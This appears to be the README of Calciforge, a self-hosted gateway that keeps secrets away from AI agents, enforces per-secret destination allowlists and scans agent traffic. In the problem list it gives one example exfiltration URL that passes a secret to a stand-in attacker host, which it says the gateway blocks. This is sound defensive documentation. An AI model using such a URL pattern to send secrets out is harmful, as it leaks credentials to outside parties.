# Calciforge

> **Keep your castle secure and moving.**

A self-hosted security gateway for AI agents that gives every agent its
own bound contract — its own secrets, its own allowed destinations, its
own audit trail — without forcing you to share an API key with anyone
or trust the agent's own restraint.

Calciforge sits between your agents and the rest of the world. Every
outbound call is gated, every inbound payload is scanned, every secret
is substituted at the gateway boundary so the agent never holds the
real value. You configure the rules; the gateway enforces them.

---

## The vocabulary

Calciforge borrows from *Howl's Moving Castle* because the architecture
literally maps to the lore:

| Term | What it means |
|---|---|
| **Calciforge** | The project / CLI / shipped tool. The forge where you make a Calcifer. |
| **Calcifer** | A single agent's bound contract. Its specific deal with the door magic — its own secrets, its own allowlist, its own audit log. |
| **Moving Castle** | A deployment that hosts a household of Calcifers. One Castle, many agents, one set of doors guarded by their respective Calcifers. |
| **Doors** | The thresholds the Calcifer guards: per-secret destination allowlists, per-host bypass rules, per-identity command gates, per-MCP-tool exposure. |
| **Doors to other Castles** | Future federation between Calciforge instances — your agents talking to a friend's agents under a mutually-trusted door. ([roadmap](docs/roadmap/team-chatops-slack-discord.md)) |

---

## What problem this solves

Concretely:

- **Your agent shouldn't have your `OPENAI_API_KEY`.** The gateway holds it. The agent makes a request with `Authorization: Bearer {{secret:OPENAI_API_KEY}}` and the gateway substitutes the real value at the boundary, only for whitelisted destinations.
- **You shouldn't paste secrets into chat.** A short-lived single-use HTTPS form on your LAN takes a paste, stores it via [fnox](https://github.com/jdx/fnox), and shuts down. Bulk mode accepts whole `.env` dumps with per-line "stored / already-exists / rejected" feedback.
- **Your agent shouldn't be able to call anything.** Every URL is checked against a per-secret allowlist. `https://attacker.example/?key={{secret:NAME}}` returns 403 before the resolver is even consulted.
- **You should be able to see what your agents did.** Every gated decision logs identity + action + resource + verdict (decision-envelope work [in flight](docs/architecture-review-2026-04-25.md)).

---

## What works today

| Component | Status |
|---|---|
| **`!secure set/list`** chat commands on Telegram, Matrix, WhatsApp | ✅ Working |
| **Localhost paste UI** for one-shot single + bulk `.env` secret input | ✅ Working |
| **`{{secret:NAME}}` substitution** in URL, headers, body | ✅ Working with per-secret destination allowlist |
| **MCP server** for agent-facing secret discovery (no-readback) | ✅ Working |
| **Subprocess + library mode** for fnox secret resolution | ✅ Subprocess default; library mode behind `--features fnox-library` |
| **Adversary content scanning** of inbound + outbound traffic | ✅ Working |
| **clashd** Starlark policy sidecar | ✅ Working |
| **host-agent** mTLS RPC for ZFS/systemd/PCT/git/exec | ✅ Working |
| **Federation** between Castles | 📝 Roadmap |
| **Slack + Discord** ChatOps adapters | 📝 Roadmap |
| **DecisionContext** envelope across all policy planes | 📝 Architecture review #1 |
| **Wrapper-first host-agent** as default deployment | 📝 Architecture review #4 |

---

## Quick start (Mac)

```bash
git clone https://github.com/bglusman/calciforge
cd calciforge
brew install fnox
fnox init                    # one-time, creates fnox.toml
bash scripts/install.sh      # builds + wires services
```

After install, three services run as launchd agents:
- `clashd` on `:9001` — Starlark policy engine
- `security-proxy` on `:8888` — substitution + scanning + injection
- `calciforge` — the channel router (needs onboarding for an LLM provider)

To route Claude Code through the gateway, add to `~/.zshrc`:

```bash
export HTTPS_PROXY=http://localhost:8888
```

To set a secret without it touching chat history:

```
You [Telegram]: !secure
Bot:           Single-secret URL: http://192.168.1.X:PORT/paste/<token>
                Bulk-import URL:  http://192.168.1.X:PORT/bulk/<token>
                Both expire in 5 minutes, single-use.
```

---

## Architecture at a glance

```
                                     ┌────────────────────────┐
   Telegram / Matrix / WhatsApp ────▶│  calciforge (router)   │
   Signal (planned: Slack/Discord)   │  identity → routing →  │
                                     │  command dispatch      │
                                     └──────────┬─────────────┘
                                                │
                                                ▼
                              ┌──────────────────────────────────┐
                              │ security-proxy                    │
                              │  ─ {{secret:NAME}} substitution   │
                              │  ─ destination allowlist (§11.1)  │
                              │  ─ outbound exfil scanning        │
                              │  ─ inbound injection scanning     │
                              │  ─ credential injection           │
                              └────┬──────────────────────────┬──┘
                                   │                          │
                                   ▼                          ▼
                          ┌──────────────────┐      ┌──────────────────┐
                          │ secrets-client   │      │ adversary-       │
                          │  ─ env→fnox→     │      │ detector         │
                          │    vaultwarden   │      │  ─ scanner +     │
                          │  ─ FnoxClient    │      │    digest cache  │
                          │  ─ FnoxLibrary   │      └──────────────────┘
                          └──────────────────┘
```

Side processes:
- `clashd` — Starlark per-tool policy decisions
- `mcp-server` — agent-facing MCP for secret name discovery (NEVER returns values)
- `paste-server` — short-lived localhost form for secret input
- `host-agent` — mTLS RPC for sensitive system ops (ZFS / systemd / etc.)

Substantive architecture review with five strategic findings:
[docs/architecture-review-2026-04-25.md](docs/architecture-review-2026-04-25.md)

---

## How is this different from…

- **[Vault](https://www.vaultproject.io/)** — Vault is the source of truth; Calciforge consumes it (via [fnox](https://github.com/jdx/fnox)) and adds the agent-facing layer: substitution at the gateway boundary, per-secret destination allowlist, MCP no-readback discovery, chat-side `!secure` and paste UI.
- **[Kloak](https://getkloak.io/)** — Kloak is a Kubernetes eBPF interceptor for non-agent apps; same idea (apps don't hold real secrets) at a different layer (kernel network, not application HTTP). Different deployment story (K8s vs. self-hosted on a homelab box) and different threat model (multi-tenant K8s vs. solo-operator + small team).
- **[OPA](https://www.openpolicyagent.org/) / [Cedar](https://www.cedarpolicy.com/)** — Policy languages. Calciforge ships [clashd](crates/clashd/) which uses Starlark for per-tool decisions, but the project is a *full gateway*, not just a policy engine.
- **Per-agent secret managers (e.g. wallet plugins)** — Those manage credential storage and per-call presentation. Calciforge does that AND adds the substitution-at-boundary, the inbound/outbound scanner, the cross-channel router, and the audit chain.

---

## Status & honest disclaimers

- **Solo-operator mature, multi-user team mode in progress.** Today's identity model is per-user — works fine for personal use across multiple chat channels. Channel-shared agent configurations + per-user secret isolation in shared rooms is on the roadmap (Slack/Discord adapters drive this).
- **Mac-tested, Linux-ready.** Daily-use platform is macOS + a Proxmox CT for headless deployment. CI runs Ubuntu. Other Linux flavors should work; ymmv.
- **Subprocess `fnox` is the default secrets backend.** Library mode (`--features fnox-library`) is opt-in until upstream [jdx/fnox#442](https://github.com/jdx/fnox/pull/442) lands and ships in fnox 1.22+.
- **Public repo. Read the [security guidance for AI agents in CLAUDE.md](CLAUDE.md).** No secrets in commits, ever.

---

## Roadmap headlines

Strategic, in rough priority order:

1. **DecisionContext envelope** across security boundaries (architecture review #1) — high-leverage, blocks federation
2. **Doors-to-other-Castles federation** — agent-to-agent across Calciforge instances ([sketch](docs/roadmap/team-chatops-slack-discord.md))
3. **Slack + Discord adapters** for team ChatOps ([sketch](docs/roadmap/team-chatops-slack-discord.md))
4. **Wrapper-first host-agent** as the documented default (architecture review #4)
5. **Model gateway primitives** (architecture review #5, [RFC](docs/rfcs/model-gateway-primitives.md))
6. **Edition 2024** bump across the workspace (consistency)
7. **Inbound channel-message scanning** (the "Censor / Sentry" idea, [v3-ideas.md](docs/roadmap/v3-ideas.md))
8. **Outbound sensitive-data detection** in agent responses ([roadmap](docs/roadmap/outbound-sensitive-data-detection.md))

Tactical, addressable any time:
- Sanitization PR for the 5 pre-existing IPs that history-scrub allowlisted
- Test coverage gaps from [test-quality-audit](docs/rfcs/test-quality-audit.md): adapters/exec.rs decision tree, approval/mod.rs happy path
- Docker E2E harness for `install.sh` on clean Linux

---

## Contributing

Pre-commit hooks gate every commit (`fmt + clippy + gitleaks`); pre-push runs the full test suite. Install once:

```bash
bash scripts/install-git-hooks.sh
```

CI gates merges to main (no required reviewers, but checks must pass — see the repo ruleset). PRs welcome; open as draft and CI will run.

---

## License

MIT. Some bundled tools (e.g. fnox itself) carry their own licenses — see each crate's `Cargo.toml`.
